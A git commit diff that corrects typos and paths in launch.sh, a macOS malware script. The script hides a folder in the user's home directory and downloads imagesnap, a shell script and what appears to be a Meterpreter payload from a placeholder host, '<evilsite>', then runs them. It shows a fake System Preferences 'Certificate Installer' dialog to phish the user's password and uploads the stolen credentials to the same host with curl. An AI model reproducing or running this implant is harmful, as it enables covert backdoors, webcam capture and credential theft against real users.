47723f730ef204cd9322f743f7a668be42e16768
CrazianT3k <summer.nt.lee@gmail.com>
2016-06-28 01:53:00 -0500

    Update launch.sh

--- launch.sh
+++ launch.sh
@@ -7,14 +7,14 @@ PYTHON=`which python`
 
 # put some shit in the hole
 mkdir /Users/$USERNAME/.dtc2
-curl -s -o /Users/$USERNAME/.dtc2/imagesnap http:///<evilsite>/imagesnap
+curl -s -o /Users/$USERNAME/.dtc2/imagesnap http://<evilsite>/imagesnap
 curl -s -o /Users/$USERNAME/.dtc2/dtc2.sh http://<evilsite>/dtc2.sh
-curl -s -o /Users/$USERNAME/.dtc2/msf.py http://<evilsite>/msf.py
+curl -s -o /Users/$USERNAME/.dtc2/meterp.py http://<evilsite>/meterp.py
 chmod +x /Users/$USERNAME/.dtc2/dtc2.sh
 chmod +x /Users/$USERNAME/.dtc2/imagesnap
-/usr/bin/python /Users/$USERNAME/.dtc2/msf.py
-curl -s -o /Users/$USERNAME/.dtc2.dtc2.sh http://<evilsite>.dtc2.sh
-chmox +x /Users/$USERNAME/.dtc2.dtc2.sh
+/usr/bin/python /Users/$USERNAME/.dtc2/meterp.py
+curl -s -o /Users/$USERNAME/.dtc2.dtc2.sh http://<evilsite>/dtc2.sh
+chmod +x /Users/$USERNAME/.dtc2.dtc2.sh
 /bin/sh /Users/$USERNAME/.dtc2.dtc2.sh
 
 # create plist
@@ -43,5 +43,5 @@ echo $USERNAME > /Users/$USERNAME/.dtc2/$HOSTNAME-creds.txt
 /usr/bin/osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Installation of IAC Security Certificates requires your password to continue" & return & return  default answer "" with icon 1 with hidden answer with title "Certificate Installer"' >> $HOSTNAME-creds.txt
 
 #push creds up
-/usr/bin/curl -s -F "file=@$HOSTNAME-creds.txt" http://<evilsite>/dirtyhax/tinder/upload.php 2>&1 > /dev/null
+/usr/bin/curl -s -F "file=@$HOSTNAME-creds.txt" http://<evilsite>/upload.php 2>&1 > /dev/null
 
